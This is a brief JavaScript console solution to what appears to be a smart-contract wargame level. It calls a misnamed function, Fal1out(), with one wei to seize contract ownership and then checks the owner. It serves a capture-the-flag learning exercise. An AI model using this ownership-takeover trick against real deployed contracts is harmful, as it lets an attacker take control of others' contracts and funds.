/*
Tools needed for this level:
- Console
 */

// 1.- Execute the Fal1out() function to become owner
await contract.Fal1out({value: '1'});

// 2.- Check if we are owner of contract
await contract.owner();
